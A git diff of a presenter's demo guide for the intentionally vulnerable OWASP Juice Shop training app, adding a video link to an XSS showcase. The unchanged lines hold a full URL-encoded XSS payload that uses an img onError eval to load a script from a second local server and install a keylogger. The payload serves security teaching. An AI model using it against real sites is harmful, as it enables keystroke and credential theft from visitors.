@@ -80,7 +80,7 @@ Then show how to submit a zero-star review:
 <details>
 <summary>More info</summary>
 
-Showcase the XSS demo (more detailed instructions [here](https://github.com/juice-shop/shake-logger/blob/master/README.md)):
+Showcase the XSS demo (more detailed instructions [here](https://github.com/juice-shop/shake-logger/blob/master/README.md)) (youtube video [here](https://www.youtube.com/watch?v=Msi52Kicb-w)):
 
 1. Open the keylogger at (http://localhost:8080/logger.php).
 2. Open this [link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) in a new tab to start the XSS attack. Explain why following malicious links is a very common scenario. Your page will run some malicious JS that plays music and shakes to its sound, while it installs a keylogger.
